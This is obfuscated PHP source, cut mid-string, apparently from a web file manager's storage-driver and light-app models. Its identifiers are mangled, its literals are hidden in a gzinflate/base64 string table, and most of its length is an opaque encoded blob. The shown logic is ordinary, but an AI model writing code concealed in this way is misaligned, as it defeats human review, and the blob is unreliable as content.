array($c¡‚ÍÌŞÑØ[34] => 0)); } } } goto béï£æ‹¿­; C£§¦Á¡÷Ÿ: } public function checkConfig(&$F„©Ò¶°¤´) { goto aÎœï–¾Â; Eêà¾ÊËá: $F»¤œ—±Ü = $B±ˆ“Å½ø„[72] . $dñš‡æÆ; $DÌŠ¶íøƒ = new $F»¤œ—±Ü($cà½º ¼¢‹); if (in_array($fó„¾ÒİÜ¶, $DÌŠ¶íøƒ->objectDriver)) { if (!$DÌŠ¶íøƒ->isBucketCors() && !$DÌŠ¶íøƒ->setBucketCors()) { show_json(LNG($B±ˆ“Å½ø„[1760]), !1); } } goto e¢¦„§øÜ¬; aÎœï–¾Â: $B±ˆ“Å½ø„ =& $_SERVER[ÍÓÖ€°å]; $fó„¾ÒİÜ¶ = strtolower($F„©Ò¶°¤´[$B±ˆ“Å½ø„[89]]); $cà½º ¼¢‹ = json_decode_force($F„©Ò¶°¤´[$B±ˆ“Å½ø„[6]]); goto D†¶ˆ…Ú²Í; D†¶ˆ…Ú²Í: foreach ($cà½º ¼¢‹ as $AîÀù…²îó => $E¸¥¾‘­) { $cà½º ¼¢‹[$AîÀù…²îó] = trim($E¸¥¾‘­); } $D¼˜¼Ì³ŠØ = rtrim($cà½º ¼¢‹[$B±ˆ“Å½ø„[746]], $B±ˆ“Å½ø„[8]) . $B±ˆ“Å½ø„[8]; $dñš‡æÆ = $this->driverType($fó„¾ÒİÜ¶); goto Eêà¾ÊËá; e¢¦„§øÜ¬: $FòÙ—ÇÚ‘² = $DÌŠ¶íøƒ->getPath($D¼˜¼Ì³ŠØ . $B±ˆ“Å½ø„[1363]); if (!$DÌŠ¶íøƒ->mkfile($FòÙ—ÇÚ‘²)) { show_json(LNG($B±ˆ“Å½ø„[1761]), !1); } $cà½º ¼¢‹[$B±ˆ“Å½ø„[746]] = $D¼˜¼Ì³ŠØ; goto a·¤ªº¹İ»; a·¤ªº¹İ»: $F„©Ò¶°¤´[$B±ˆ“Å½ø„[6]] = json_encode($cà½º ¼¢‹); $F„©Ò¶°¤´[$B±ˆ“Å½ø„[89]] = $dñš‡æÆ; return !0; goto C»‚†Ü‘Æ˜; C»‚†Ü‘Æ˜: } private function driverType($DØä¸‹’¼Ù) { $EÓë–°‡© =& $_SERVER[ÍÓÖ€°å]; $bÆ‘£ø›Âé = array($EÓë–°‡©[125] => $EÓë–°‡©[1762], $EÓë–°‡©[58] => $EÓë–°‡©[1763], $EÓë–°‡©[65] => $EÓë–°‡©[747]); if (isset($bÆ‘£ø›Âé[$DØä¸‹’¼Ù])) { return $bÆ‘£ø›Âé[$DØä¸‹’¼Ù]; } return strtoupper($DØä¸‹’¼Ù); } public function driverListSystem() { $b‰ŸÒãôâˆ =& $_SERVER[ÍÓÖ€°å]; $EÌ¼‡–œÒò = parent::listData(); $EÁ²ª¡Œ¬ = array(); foreach ($EÌ¼‡–œÒò as $dîãçÈ• ˆ) { unset($dîãçÈ• ˆ[$b‰ŸÒãôâˆ[175]], $dîãçÈ• ˆ[$b‰ŸÒãôâˆ[101]]); $dîãçÈ• ˆ[$b‰ŸÒãôâˆ[6]] = json_decode_force($dîãçÈ• ˆ[$b‰ŸÒãôâˆ[6]]); $EÁ²ª¡Œ¬[] = $dîãçÈ• ˆ; } return $EÁ²ª¡Œ¬; } public function defaultDriver() { $DÃù¤Ÿç± =& $_SERVER[ÍÓÖ€°å]; $bŠÇ¯µØ» = parent::listData(); $D˜³‚‰‹åğ = array_filter_by_field($bŠÇ¯µØ», $DÃù¤Ÿç±[34], 1); $D˜³‚‰‹åğ = $D˜³‚‰‹åğ[0]; if ($D˜³‚‰‹åğ) { $D˜³‚‰‹åğ[$DÃù¤Ÿç±[6]] = json_decode($D˜³‚‰‹åğ[$DÃù¤Ÿç±[6]], !0); } return $D˜³‚‰‹åğ; } public function driverInfo($f´ÓŞ¬„) { $b·£ÔÉÀ’Á =& $_SERVER[ÍÓÖ€°å]; $B°½Øôƒš = array_to_keyvalue(parent::listData(), $b·£ÔÉÀ’Á[357]); if (!isset($B°½Øôƒš[$f´ÓŞ¬„])) { return !1; } $c¡ÄŠ…Í¬¯ = $B°½Øôƒš[$f´ÓŞ¬„]; $c¡ÄŠ…Í¬¯[$b·£ÔÉÀ’Á[6]] = json_decode_force($c¡ÄŠ…Í¬¯[$b·£ÔÉÀ’Á[6]]); return $c¡ÄŠ…Í¬¯; } public function removeWithFile($D„Û½—’á‘) { goto fİÆ¤ÍöÏ™; f³äƒÚ¸¿: $cÑÔµùø£ = Model($F¤„ß¸‰Ç[155])->where($a°ÒÔ…“È)->field($F¤„ß¸‰Ç[1767])->select(); foreach ($cÑÔµùø£ as $D­ˆ‡ËµÚ—) { goto c·ˆÏ¹‘Ì; c·ˆÏ¹‘Ì: $f™—‚Æà = $D­ˆ‡ËµÚ—[$F¤„ß¸‰Ç[76]]; $AôÂÆİß¸ = $eÔ´†¿Œ– . str_replace("\173\151\157\72{$D„Û½—’á‘}\175\x2f", $F¤„ß¸‰Ç[33], $f™—‚Æà); if (!IO::exist($f™—‚Æà)) { $this->removeByFileID($D­ˆ‡ËµÚ—[$F¤„ß¸‰Ç[373]]); continue; } goto A·†á†¸èâ; CÃà“…×·: Model($F¤„ß¸‰Ç[155])->where($a°ÒÔ…“È)->save($Fñ¶«¢ÇğÕ); goto F¶¢¡àŒ¾; A·†á†¸èâ: if (!IO::exist($AôÂÆİß¸) && !IO::move($f™—‚Æà, $AôÂÆİß¸)) { continue; } $a°ÒÔ…“È = array($F¤„ß¸‰Ç[373] => $D­ˆ‡ËµÚ—[$F¤„ß¸‰Ç[373]]); $Fñ¶«¢ÇğÕ = array($F¤„ß¸‰Ç[471] => $a˜òÄåÛ½µ, $F¤„ß¸‰Ç[76] => $AôÂÆİß¸); goto CÃà“…×·; F¶¢¡àŒ¾: } return parent::remove($D„Û½—’á‘); goto cÑÌƒ•…µ; fİÆ¤ÍöÏ™: $F¤„ß¸‰Ç =& $_SERVER[ÍÓÖ€°å]; $a°ÒÔ…“È = array($F¤„ß¸‰Ç[471] => $D„Û½—’á‘); $aö†Éïìî = Model($F¤„ß¸‰Ç[402])->where($a°ÒÔ…“È)->count(); goto B‰êä¡Ò–; B‰êä¡Ò–: $fˆš§îŸŠ— = Model($F¤„ß¸‰Ç[402])->where($a°ÒÔ…“È)->sum($F¤„ß¸‰Ç[78]); $Bö¡Ü‰¹Ã— = new TaskFileTransfer($F¤„ß¸‰Ç[1764] . $D„Û½—’á‘, $F¤„ß¸‰Ç[1765], $aö†Éïìî, LNG($F¤„ß¸‰Ç[1766]) . "\50{$D„Û½—’á‘}\x29"); $Bö¡Ü‰¹Ã—->task[$F¤„ß¸‰Ç[446]] = $fˆš§îŸŠ—; goto f²¥—°’¥õ; f²¥—°’¥õ: $E‚ˆõ®‚© = KodIO::defaultDriver(); $a˜òÄåÛ½µ = $E‚ˆõ®‚©[$F¤„ß¸‰Ç[357]]; $eÔ´†¿Œ– = "\x7b\x69\x6f\72{$a˜òÄåÛ½µ}\175\57"; goto f³äƒÚ¸¿; cÑÌƒ•…µ: } public function progress($C…Æ¡„Åñˆ) { return Task::get($_SERVER[ÍÓÖ€°å][1764] . $C…Æ¡„Åñˆ); } private function removeByFileID($b¾ë¯ˆ‹ÇÇ) { $Bš¼œ£ÚÏ =& $_SERVER[ÍÓÖ€°å]; $b¢¶›¯ÄÕ = Model($Bš¼œ£ÚÏ[827])->field($Bš¼œ£ÚÏ[1740])->where(array($Bš¼œ£ÚÏ[373] => $b¾ë¯ˆ‹ÇÇ))->select(); $b¢¶›¯ÄÕ = array_to_keyvalue($b¢¶›¯ÄÕ, $Bš¼œ£ÚÏ[33], $Bš¼œ£ÚÏ[365]); foreach ($b¢¶›¯ÄÕ as $AĞ‘Ù‚·Æõ) { Model($Bš¼œ£ÚÏ[949])->remove($AĞ‘Ù‚·Æõ, !1); } } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\x4c\151\x67\x68\x74\x41\160\160"; public $modelType = "\x53\171\163\x74\145\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array("\156\141\155\x65", "\147\162\157\x75\x70", "\x64\x65\163\x63", "\143\x6f\156\164\145\x6e\x74"); public function listData($f‹Ş¹°ÃÅ = false, $e…ˆß³”Š = "\x6d\x6f\144\x69\x66\x79\x54\151\x6d\x65", $A°™Úçóƒ = true) { return parent::listData($f‹Ş¹°ÃÅ, $e…ˆß³”Š, $A°™Úçóƒ); } public function remove($aä™ê ÉÜÍ) { $A¦÷‡‡ “ß = $this->findByName($aä™ê ÉÜÍ); if (!$A¦÷‡‡ “ß) { return !1; } return parent::remove($A¦÷‡‡ “ß[$_SERVER[ÍÓÖ€°å][357]]); } public function add($d¶º”ŒÓŞš) { if ($this->findByName($d¶º”ŒÓŞš[$_SERVER[ÍÓÖ€°å][28]])) { return !1; } return parent::insert($d¶º”ŒÓŞš); } public function update($C¿‡ÕÕ¶•í, $AĞŒˆñ­ó¨) { $cíì‰¸æŒˆ =& $_SERVER[ÍÓÖ€°å]; $d—ëéëù„– = $this->findByName($C¿‡ÕÕ¶•í); $c§ÈÁè”½Ã = $this->findByName($AĞŒˆñ­ó¨[$cíì‰¸æŒˆ[28]]); if (!$d—ëéëù„– || $c§ÈÁè”½Ã && $c§ÈÁè”½Ã[$cíì‰¸æŒˆ[357]] != $d—ëéëù„–[$cíì‰¸æŒˆ[357]]) { return !1; } return parent::update($d—ëéëù„–[$cíì‰¸æŒˆ[357]], $AĞŒˆñ­ó¨); } } goto e²À½è¼äë; aßùˆˆÆ: if (!function_exists('_kodDe')) { function _kodDe($EŞ©œõ‹Ã†) { $EŞ©œõ‹Ã† = base64_decode($EŞ©œõ‹Ã†); $a’•Õ×Õ¿ï = strlen($EŞ©œõ‹Ã†); $a‹áç”½×Ò = ''; $e†½»îŞÍ’ = ord($EŞ©œõ‹Ã†[0]) - 30; for ($Eâ¯•ŠÃèÀ = 1; $Eâ¯•ŠÃèÀ < $a’•Õ×Õ¿ï; $Eâ¯•ŠÃèÀ += 2) { if ($Eâ¯•ŠÃèÀ + 1 < $a’•Õ×Õ¿ï) { $a‹áç”½×Ò .= chr(ord($EŞ©œõ‹Ã†[$Eâ¯•ŠÃèÀ + 1]) + $e†½»îŞÍ’); $a‹áç”½×Ò .= chr(ord($EŞ©œõ‹Ã†[$Eâ¯•ŠÃèÀ]) + $e†½»îŞÍ’); } else { $a‹áç”½×Ò .= chr(ord($EŞ©œõ‹Ã†[$Eâ¯•ŠÃèÀ]) + $e†½»îŞÍ’); } } return $a‹áç”½×Ò; } } define(base64_decode('zdPWgLDl'), "\xaf"); $_SERVER[ÍÓÖ€°å] = explode(strrev('|||'), gzinflate(substr(base64_decode('H4sIAAAAAAAAE509CYATRbaeq+CxKp6A2gzgHOQYTnFgGDJJZiaQTEKS4Zo=').base64_decode('DKGT9Mw0k6RDd2cOGDzQVRBhvW9dj9WvqyKo4KIiIijqul6oeKy6qIAHoq4=')."\307\352\252\273\277\356\252\116\62\376\3\205\124\275\272\137\125\275\172\357\325\253\327\57\256\170\377\233\353\377\264\141\135\377\141\340\277\337\254\272\372\366\27\156"."\276\360\341\307\256\304\121\360\367\360\376\103\161\370\314\125\107\36\204\376\14\311\134\261\265\171\133\365\321\27\377\366\262\243\202\307\37\350\134\166\110\167\142\305".strrev('ú»ç¾^şĞ9¯”Ì~sŸÿ?uÆW±ı¸~Ëcb3É¡â¸ş¥Ü~]¯òËWˆ')."\x93\x37\x2f\x1c\x31\xee\x94\x95\x4f\xbe\xb7\x49\xfa\xb9\x46\x5e\xb1\xf8\x8c\x9b\x2a\xb6\x9e\xfb\xe2\x81\xaf\xff\xeb\xa2\xaf\x2f\xff\xa6\x73\xfc\x89\x93\xaf\xf8\xe7\xf5\x97\x6e"."\171\340\245\376\57\313\76\73\367\366\213\246\105\277\14\135\60\167\367\126\345\245\107\365\363\53\147\15\375\333\322\217\57\336\177\136\360\227\150\346\133\243\355\232"."\307\356\177\163\311\217\33\347\377\345\337\345\331\112\371\275\107\322\237\166\365\276\61\262\272\167\303\360\373\262\322\341\247\164\273\107\67\277\264\56\347\333\177\364"."\340\272\205\376\316\363\137\235\141\373\374\226\347\376\172\127\366\252\143\117\233\367\321\326\205\251\106\327\331\307\355\377\147\277\143\317\267\75\67\215\132\364\126\315".base64_decode('77dsmTX9Lx8P2j+5cfHrB1bs+7rq5oPmHZS/74eDDzoIo6AG/0hZzZSUXtU=').base64_decode('MA0MSGrZdrUDh9Us/nXiH2NxWjUVHI43B6PxSEso5A1H46RGMT2jpUgoJ+s=')."\162\206\124\236\123\164\3\64\45\126\27\317\151\71\45\153\201\160\100\112\66\345\204\154\220\232\74\365\161\217\67\344\17\316\213\107\347\205\274\44\107\42\276\70"."\xaf\xe8\x7d\x38\x86\x82\x11\x53\xd6\xcd\xa8\x9a\x51\x58\x8e\x1e\x9d\xf5\xab\xde\xdb\xe8\x6b\x96\xa2\x61\x57\x73\xc4\xe5\x8e\xfa\x82\xcd\x18\xec\xe\x6\x2\xbe\x68\x31\x3c\x1c"."\xf4\xfb\xeb\x5d\xee\x99\xc5\x29\xa1\xb0\xab\x31\xe0\x92\x40\xff\xd2\x4a\x5c\xcd\xb6\x6b\x15\xd2\x42\x9c\xb2\x50\xaa\xc4\x81\x6\x55\x49\xa7\x70\x30\x2b\xd3\xee\x98\x7d\x39\x12".base64_decode('irIQmINsPp3GkWYWIv1X2uV8muDMI0ZyupqR6dBnKn0MigNy3tTUbBJHvL0=')."\246\56\163\70\350\161\122\127\62\112\226\124\25\361\372\275\356\250\4\273\51\65\204\203\1\211\114\105\106\66\114\105\227\346\64\171\303\136\11\166\275\266\34\215"."\270\134\302\345\132\232\1\102\44\227\337\57\15\124\203\251\144\162\264\32\134\246\104\145\301\260\307\33\226\352\347\111\34\117\111\55\223\321\262\16\120\13\230\117"."\x53\xe8\xaa\x37\x1c\xc6\x1\x1b\x59\xc1\x7e\x1f\x9c\x3a\x12\x9\x36\x34\x44\xbc\x2c\x46\x6\x37\xcb\xf\x7a\x32\x9e\xac\x52\x4b\x2c\xd5\x9e\x36\xe3\xdd\x72\x3a\x4f\x17\x6b\x17"."\376\55\47\77\344\127\63\310\2\136\254\146\325\74\131\254\244\12\115\63\350\222\67\330\36\42\1\205\6\262\54\23\250\100\43\273\13\154\265\156\34\254\235\206"."\x7f\xa7\x90\x4c\x89\x38\x4c\x53\x74\x33\xae\x64\x93\x5a\x4a\xcd\x92\xd\x59\x47\x36\x1f\x59\x82\xb2\xd9\xe9\xd1\x55\x90\x8f\x54\xa8\x39\x92\x5a\xae\x2f\xa0\x75\x93\xd1\xb4\xab"."\x69\xc5\xcf\xf6\x5b\xbb\x96\x4e\x29\x3a\x8f\xe7\x40\x71\x31\x85\xc\x4b\x5d\x22\x94\x6e\xce\x67\xc4\x2c\x2c\x9a\xec\x54\xd3\x29\x9d\x6e\xd3\x5f\xcb\x69\x28\xa6\x9\xfa\x6f\xd0".strrev('¶ïşÀ½h¬ãüàa)æ]BD¥µr,'."\0".'`Ûã=4Avë:(ŠœšÒä¶.')."\xd6\xe9\xe0\x9f\x4a\x42\xb3\x62\xa4\x17\x9d\x4a\x3a\x1d\x57\x7a\x15\xb2\x1d\x32\xa9\x89\x6\xed\xa1\xd3\x48\xa8\x59\x27\x80\xe0\xa8\x2f\x18\xef\x94\x8d\xce\x40\x6a\x62\x1c\x95"."\x22\x1d\xcf\xa6\x94\x5e\x47\xae\x33\x47\xe6\x93\x6d\x52\xb2\x4e\x21\x32\x9b\x35\xd3\x2b\x50\x52\x8f\x4d\x4a\x49\x1\x69\x9e\xd4\x54\xa3\xd6\xb0\x35\x92\x52\xdb\xfb\x38\x71\x2a"."\xc3\x3f\xa6\xd2\x6b\x92\xe\x4b\x53\x92\x9d\xb2\xe\xb0\x56\x9b\x37\xdb\xed\x93\xc9\x96\xcd\xe5\xd2\x6a\x52\x36\x55\x2d\xeb\xd4\x92\xa6\x62\xda\xd\x53\x57\x64\x32\x80\xb2\x29".strrev('$jfÂ¡šr5G›4£35NY/vè®Ñ¬åÕÇÖZİnº)pªw¸œ')."\331\64\345\144\47\334\167\274\372\332\137\311\257\146\323\152\126\31\60\57\244\166\65\144\103\172\173\163\252\256\30\64\52\65\6\242\44\63\150\121\261\207\164\271".strrev('«Ô@n×Ùàƒã‚­M€®»L7“)6£	)ék 6œ0õ¬šŒ|¹H×##').strrev('«(Ùöƒ¹M·H›ºŠà<of¸'."\0".'×ÜPÑ¢›C'."\r".'4I¬ÀOWÇ€´ÊJ')."\222\2\347\332\203\171\263\1\156\6\60\176\16\14\151\75\212\16\32\256\357\253\221\272\264\124\102\353\165\320\44\230\71\2\166\34\315\354\112\46\225\234\151\17"."\313\331\16\210\237\104\237\251\220\225\223\326\222\162\132\334\60\70\334\151\232\271\210\222\115\301\212\310\306\320\172\262\150\213\345\24\72\240\210\67\74\333\33\216"."\x47\x82\xd\xd1\x39\xae\x30\x39\x39\xb3\x1d\x6a\xb6\x97\xf6\x3\xb6\x9b\xb6\x87\x95\x14\x98\x97\xa4\x49\x7b\x23\xe7\x20\x4a\x69\x1e\xd8\xc\x9c\x5c\x9a\xa\x9b\xa6\x69\x7e\x5f"."\x23\xc4\x9a\xc7\x6e\x80\x4c\x76\x31\x17\xad\xdb\xaf\x66\x54\x38\x30\x93\xa5\x20\x34\x83\x63\xb5\x91\x74\xc8\x89\x46\x5b\x1b\xeb\xac\xaa\x88\xa5\xc6\x54\xda\xc1\xbf\x55\x95\xad"."\61\217\243\252\255\316\251\362\62\316\261\216\261\322\270\352\111\122\10\234\363\252\234\226\310\22\53\312\121\55\5\147\132\27\241\137\311\166\230\235\204\365\11\173"."\x67\xb5\x78\x23\xd1\x78\xc0\x1b\x6d\xa\x7a\x48\x69\xaf\xcb\xc3\x47\x57\xe3\x74\xf2\x88\xc1\x62\x7e\xd\x6f\x45\x3a\x10\x70\xa\x77\x28\x49\x2d\xad\xe9\x72\x1a\x4e\x13\x5d\x74"."\140\123\343\100\207\332\336\317\10\245\17\360\12\244\126\114\146\170\44\242\146\162\164\32\315\316\174\46\41\4\235\274\6\102\322\300\324\120\62\322\251\61\242\256"."\351\44\304\272\73\172\134\3\331\4\101\147\144\74\370\237\223\261\224\226\221\51\223\347\2\175\357\121\122\101\135\355\240\240\52\113\112\223\42\363\123\302\324\115".strrev(''."\0".'ªÀO¬•v•Ó—ÍÒç–º:–(V’”ËÚ7ÖyK´(uÑdjvb€–KuB'."\r".'')."\70\247\232\252\21\6\205\40\353\100\343\163\40\207\307\1\46\313\12\320\352\206\147\125\203\160\304\61\30\303\145\103\213\337\37\167\7\233\243\200\337\303\220\71"."\141\137\324\113\327\211\313\23\167\271\103\375\364\344\340\23\106\62\300\335\152\135\150\234\267\353\36\327\317\111\174\247\231\41\173\230\123\127\62\4\104\75\161\30"."\x90\xc6\x9c\x96\x35\x14\x7b\x92\xd4\x96\xe2\x74\x16\xe7\x98\x52\x40\x64\x8b\x4a\x70\x2e\xb3\xd7\x2e\x67\x96\xd8\x33\x8a\x29\xdb\x59\xd7\x17\xe5\x8\x3f\x91\xa3\x8c\xc5\xa2\x9c"."\x42\x42\x89\x4c\x4e\x58\xd5\x11\xc6\xd\xf4\xa8\x29\xca\x2e\x74\x2a\x6a\x47\x27\xe9\xb7\xf5\x90\x93\x8\x1d\xc7\x14\xca\x47\xe6\x95\x93\xe1\x34\x38\x1d\x81\x3c\x40\x4f\xc8\x50"."\60\102\12\324\101\50\340\31\22\212\116\206\24\152\41\111\31\141\115\65\172\11\160\60\131\206\235\362\130\262\0\347\104\50\11\315\203\374\272\272\104\346\350\252".strrev('2z'."\0".'¶dÚ0}xDº.<„·†-R5÷×AÆgšù6Š'."\r".'œÒf÷u!ı£')."\333\345\367\25\146\367\316\365\105\242\221\222\111\0\326\342\55\110\1\222\116\50\354\155\360\315\145\321\6\237\327\357\211\304\335\56\167\23\317\323\354\12\220\110".base64_decode('vB3KGobTmj8OqH6ESSzxbih9UZzELeJBnDK+cb5ywOmmkNVKhgtlPjQSwoA=')."\46\265\74\135\277\214\233\312\120\342\221\221\311\356\225\273\311\322\252\300\77\225\222\53\42\231\71\122\7\40\23\211\76\26\104\303\240\161\160\340\221\366\45\102"."\244\213\172\20\207\171\352\225\166\115\127\176\15\340\152\67\351\346\57\214\203\235\304\323\300\14\270\220\160\11\126\2\232\221\70\335\235\6\140\306\135\264\73\355"."\134\260\213\7\201\4\354\202\142\141\174\116\70\330\334\110\12\364\164\52\264\3\76\202\376\12\312\355\20\351\320\344\344\12\260\52\62\147\20\51\322\27\151\24"."\225\375\370\347\54\374\3\70\67\322\270\222\245\130\117\100\242\315\110\11\11\264\203\105\117\11\256\226\147\255\45\64\215\264\220\206\147\162\77\245\40\114\256\134"."\144\320\105\322\113\311\325\30\322\140\57\41\16\321\340\114\157\163\234\256\54\34\23\126\43\6\0\111\55\30\46\10\61\265\56\52\55\340\304\260\67\102\67\263"."\256\54\316\253\24\135\116\307\30\262\212\25\160\66\221\346\235\13\142\75\143\52\132\355\143\34\155\40\120\131\65\35\107\111\54\346\260\104\107\221\362\171\235\225"."\206\347\167\205\121\127\131\23\163\306\234\25\165\65\255\56\373\22\331\276\244\332\176\216\275\155\114\314\121\71\206\0\332\226\216\263\115\130\6\63\200\214\165\43"."\xdb\xc0\x4f\x6d\xac\x6e\x74\xcc\x7e\xd6\xb9\xb\xa7\xb7\xc6\xda\xca\x6b\xc6\x8c\x88\x39\x46\xc6\x7a\xda\xaa\x2a\xeb\x68\x3b\xc9\xbc\xe\x24\xa1\x64\x1f\xeb\x6a\x6a\x4c\x5\xe8"."\x12\x60\x61\x58\x96\x2c\xa2\x6c\x42\x6\x9a\xb0\x44\xcd\x71\xe8\xd2\x49\xcb\x28\x1c\xcc\xa1\xd2\xc1\x4b\xb4\xda\x63\x63\xda\xea\x84\x72\x2\xa8\xb0\x2d\xc0\xe2\x0\x32\xdb\xc9"."\362\271\354\363\341\310\130\121\270\357\311\372\310\147\223\234\110\302\175\221\220\223\204\16\250\35\131\266\205\300\141\317\44\120\53\133\275\164\64\376\135\106\47\262".strrev('s1X„’ã(8°q-ÀË¡G³\'}t™ $Å•ga*bê³æudé#T6G¡C')."\xa4\x5\x2e\x2b\x29\x48\xb8\x20\xa3\xc8\xc5\x21\x4b\xd6\xc3\x62\x29\x25\x4b\xe6\x69\x10\xc9\x6d\x24\xe5\x9c\x12\x11\x46\x18\x8f\x47\x5d\xf5\x7e\x6f\x9c\x52\x18\x42\x89\x69\x1c".base64_decode('UcV6ppMCQ+MUlcmEnG2Oi8jLyZRPgFIjO/udFbFYvlVJtbWCBSnb29uWjl8=').base64_decode('Vkk5XmcM/KERTIdIyzk+Dwbgp5IE7iqh3okzSga7wGRzTWc8EYRzztTUTDk=')."\xcd\xb2\xc1\xb4\x28\x84\x10\xbc\xb3\xa3\x13\x72\x15\x82\x92\xb\x51\xb4\x66\xa6\xc1\x11\xd4\x2a\x4c\x6a\xb7\xc2\x6c\x42\x14\xff\x5b\x4b\x4\x62\x9f\xc7\x4e\xd0\xed\x9a\x6b\xf7".base64_decode('eXCYBdQUHTajXhmm9HjxwKV/wKGvbl3z9EP3/ELqP7j/UNoKV//+rqVtzc4=')."\352\343\116\256\257\237\337\374\352\51\13\56\157\371\363\41\167\234\130\325\142\373\354\344\336\351\367\374\343\254\235\157\376\151\130\343\306\310\244\173\216\370\373\101"."\303\227\17\313\215\374\176\350\133\137\277\354\177\315\366\304\43\337\254\336\61\376\243\257\367\71\47\356\12\275\375\314\376\237\77\371\371\207\237\107\375\74\364\215".base64_decode('Tw65MhjdvWVv95m2d988bteLsedPMKe3LjrqtKRt15R1nz9xxAHbxbc9/mE=')."\xe3\xc2\x27\x7f\xf3\xcd\xa7\x37\xac\x4a\x34\xf4\x1f\x31\xbb\xf3\xef\x27\xbf\xf9\xf4\x3\x67\xb4\x54\x6e\xcc\x74\x1c\xd8\xd4\xb7\xf9\x94\x87\x8e\xde\x73\xfc\x63\x57\x1f\x7d\x54"."\203\61\66\371\364\213\323\227\37\176\161\307\15\203\42\63\337\177\354\306\163\17\231\71\371\202\324\247\37\277\372\166\346\262\321\365\147\236\271\172\274\373\314\133"."\x9e\x1f\xb6\xeb\xab\xe3\x6d\xf1\x68\xeb\x35\x1b\x97\x8e\xff\xeb\xbe\x87\x4f\x3e\xf9\x87\x7\xba\x66\x5e\x7f\xd2\x57\xf\x8d\xef\x99\x3f\xf1\xbb\x4b\xa2\xcb\x6f\x7b\xc5\x6b\x2e".strrev('WÙÏ3‚Ô{¼Ç…§î¢MIöœ¿]ÆÔê<™Xì†WmÕîú¿“Î±Õpúöõ\\')."\76\343\372\363\256\150\34\74\144\330\51\312\177\76\370\340\247\127\206\336\371\316\177\216\275\350\341\35\277\331\325\337\343\236\377\160\377\165\377\32\174\340\244\23"."\x33\x23\xc6\x5f\x77\xa8\xf7\xd9\xd0\x5e\xef\x8e\xd7\xc6\x2e\x5f\xbd\x73\xe4\xc3\xfb\x3e\x7d\xa3\xe5\x8e\x29\xfa\x7d\x3b\x9e\x38\x62\xd3\x9a\x1d\x9b\xd6\x3e\x10\x4a\xdd\x76\xf6"."\x8c\x77\x37\x1d\x34\xef\xfb\xb6\x5d\x35\x5b\x9e\xbe\x7b\xcd\xc7\xd5\xde\xea\x19\xdf\xd9\xcf\xaa\x18\xf1\x63\xd3\x96\x4f\x1f\xd9\xfc\xc4\x19\x6b\x9d\xb7\xfe\xbc\xbd\x7c\xc5\xb0"."\xb3\xbe\xfd\xc5\xf9\x4d\xcb\x4f\x43\x46\x9e\xb0\x68\xc8\xb3\x7f\xfe\xfa\x4b\xa5\x7a\xd7\xa1\x8f\xec\xbf\x68\x7f\xbe\xfa\xd4\xed\xd7\x2d\x38\xed\xb5\x5f\x3e\x7c\xe8\xa3\xf7\xe"."\xbc\x17\x33\x1e\x5e\x79\xe7\xbf\xff\x61\x3c\xf1\xf5\x88\x23\x7d\x6f\x5d\xfb\x87\xf7\x3b\xce\xf8\xfe\xfb\xe3\xbe\x3f\xf5\xdd\xb3\xde\xc\x3d\xfc\x87\x9\x4f\xbd\xed\xfe\xfb\xe9"."\147\377\64\253\342\305\160\364\222\261\217\117\171\153\376\352\247\173\77\270\146\344\163\27\315\74\115\333\376\151\142\322\212\5\277\371\340\331\163\52\357\56\233\121"."\66\156\260\266\267\145\366\360\77\337\167\327\153\267\375\327\255\275\332\346\31\241\255\57\17\136\30\172\144\305\360\275\317\334\263\362\340\253\154\337\205\26\57\271"."\303\227\74\141\350\13\173\237\232\162\376\133\55\137\56\76\142\327\252\125\57\173\276\335\361\273\353\56\34\64\367\256\217\355\273\42\137\134\231\260\107\167\376\364"."\207\55\377\376\371\207\137\106\237\377\340\266\226\235\103\217\332\161\127\325\207\201\123\376\364\316\245\247\77\171\373\331\167\255\73\367\215\373\56\130\264\77\67\344".base64_decode('1af2j3z+8Z0B57OVz4w4kHh5yRXJF85e9lL/yMiJ7VU/fvv4l/n9zgP71Rs=')."\xa2\x47\x52\xd\x3d\x60\x89\xc1\x6\xf6\x2b\xdd\x94\x21\x30\xb4\xbc\x9e\x54\xd8\x26\x30\x44\x99\x86\xb0\xc1\x48\xc0\xf4\xb8\x74\x5d\xee\x13\xcb\x0\xb9\x4c\x6\x40\x11\xd4\x4".base64_decode('5U26f1QtjqFxuKUxLIIA3m5GRHDdYiKihQ4snYk8F+45zWsr1V+u6IXVcnE=')."\xa9\x38\x46\xab\xe1\x8a\x49\x53\xd6\x1\xab\xc8\x73\x95\x8e\xd3\x72\xd6\x18\xee\x6c\x8b\x41\xfb\x81\x15\x72\x3c\x6e\xed\x7a\xd1\x14\xa8\x86\x47\x10\x5d\x39\x26\x71\xbc\x1a\xff"."\140\371\62\253\320\63\2\216\65\244\146\373\350\161\307\343\242\300\17\216\113\166\63\102\46\332\6\163\332\370\360\154\164\54\66\76\14\33\305\253\215\242\316\106"."\307\140\23\272\157\303\250\264\161\54\246\325\56\22\262\215\56\65\70\56\35\143\352\212\247\134\234\176\50\151\365\323\63\267\324\22\315\63\264\252\106\244\23\164".base64_decode('JkrOFxQhJWCQzTGMxBl/grocRq0LS9qy9rRcHx5+g65lfEGHAS9//hf5FMo=')."\x43\xc3\x46\x90\xd6\xb6\xb8\x90\x9c\x42\x2a\x82\x81\xea\xa4\xc9\xac\x2a\x8e\x31\x39\x97\xb\xe7\xc9\x6c\xe7\xd2\x79\xa6\x50\xc1\x61\x96\x14\x12\x92\x1c\x9\x61\x3\x39\x64\x2e"."\xa0\x40\x7e\x4d\xa7\x25\x5a\xc2\x7e\x38\x1b\x74\x8e\x60\x54\xcb\xb3\xac\x54\xa3\xd5\x12\xf6\x61\x80\x93\xa9\xad\x29\xdf\x88\x59\x8c\x25\x80\x29\x8c\x39\xe3\x6d\x55\x4\x1c\xa0"."\372\57\52\217\273\334\74\300\4\310\171\31\62\320\172\300\46\346\351\214\233\262\231\67\12\62\320\53\216\244\250\231\353\122\24\252\166\242\212\55\316\124\30\371"."\144\122\241\367\47\251\4\107\45\134\260\2\363\1\243\21\61\157\62\153\12\311\40\146\111\205\212\40\70\343\74\306\226\40\300\52\143\307\260\364\343\200\75\164"."\130\7\124\75\326\222\43\225\260\244\63\50\135\47\205\51\355\205\360\4\102\235\203\142\40\41\140\122\116\1\331\331\141\312\106\227\103\4\333\305\124\300\0\202".base64_decode('saYd1otR3jkuvWf6jMXpomSOKdxEvGh0IvbISSDJRpLOa5wrIFWNk1wq2uM=')."\237\205\66\172\25\132\51\41\365\106\104\42\12\33\33\371\75\6\377\304\310\302\215\221\345\135\156\43\27\27\236\172\341\216\67\2